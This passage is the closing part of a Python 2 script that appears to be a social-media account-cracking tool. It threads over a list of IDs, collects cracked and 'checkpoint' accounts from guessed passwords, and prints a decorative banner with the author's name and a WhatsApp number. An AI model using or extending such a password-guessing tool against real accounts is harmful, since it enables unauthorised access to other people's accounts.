																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mArifull_vai\033[1;95m♡──────────•◈•──────────♡"
	print "  \033[1;93m«---•◈•---Developed By love---•◈•---»" #Arifull_vai
	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
	print """
             
             ...........███ ]▄▄▄▄▄▃
             ..▂▄▅█████▅▄▃▂
             [███████████████]
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
♡──────────────•◈•──────────────♡.
: \033[1;96m .....Arifull_vai  Bangladesh........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp Num
               01721286071"""
	
	raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
